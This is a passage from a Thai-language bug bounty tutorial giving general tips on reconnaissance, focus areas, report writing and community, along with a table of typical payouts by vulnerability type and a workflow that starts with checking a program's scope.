# รัน
# /opt/bb/auto_recon.sh target.com
```

---

## 10. Tips for Success

### เคล็ดลับจาก Top Bug Bounty Hunters

```markdown
## ทำให้ได้ผลลัพธ์ใน Bug Bounty

### 1. Mindset
- Think like an attacker, not a scanner
- หา impact ก่อนเสมอ
- อ่าน source code ถ้ามี (GitHub, public repos)
- เข้าใจ tech stack ของเป้าหมาย

### 2. Focus Areas
- Authentication/Authorization bugs ให้ผลลัพธ์สูง
- Business logic > Technical bugs
- ตามดู new features หรือหน้าที่ไม่ปลอดภัย
- Mobile app มักมี bug มากกว่า web

### 3. Recon is Key
- ใช้เวลา recon 60-70% ของเวลา
- ค้นหา assets ที่คนอื่นมองข้าม
- S3 buckets, GitHub repos, old subdomains

### 4. Documentation
- เก็บ screenshot ทุกขั้น
- เขียน notes บันทึกสิ่งที่ทดสอบ
- ใช้ Burp Suite/OWASP ZAP เก็บ history

### 5. Report Quality
- เขียน clear PoC ที่ reproduce ได้ง่าย
- แสดง impact เสมอ
- เสนอ remediation ที่ดี
- Professional และ respectful

### 6. Community
- ติดตาม writeups ของคนอื่น
- เข้าร่วม Bug Bounty conferences (H1, Defcon)
- แชร์ techniques สู่ community
```

### Most Rewarded Bug Types (2024)

| Bug Type | รางวัลเฟลี่ย | รายได้สูงสุด |
|----------|-----------|---------------|
| RCE | $10,000-$300,000 | $1M+ |
| SQLi (critical) | $5,000-$50,000 | $100K+ |
| Account Takeover | $5,000-$30,000 | $50K+ |
| SSRF | $3,000-$20,000 | $50K+ |
| XXE | $2,000-$15,000 | $30K+ |
| Stored XSS | $1,000-$10,000 | $20K+ |
| IDOR | $500-$5,000 | $20K+ |
| CSRF | $200-$2,000 | $5K+ |

---

## สรุป Bug Bounty Workflow

```
1. เลือก program
   ↓
2. อ่าน policy และ scope
   ↓
3. Recon เต็มที่
   ↓
4. Manual testing + Automation
   ↓
5. Document findings
   ↓
6. เขียน report คุณภาพสูง
   ↓
7. เขียนตอบโต้ (ถ้าถูกเถ่าใน severity)
   ↓
8. รับรางวัล
   ↓
9. เขียน writeup แชร์ (optional)
```

---

← [Part 69: Advanced RE](Part-69-Advanced-RE.md) | [Part 71: Cloud Security](Part-71-Cloud-Security.md) →
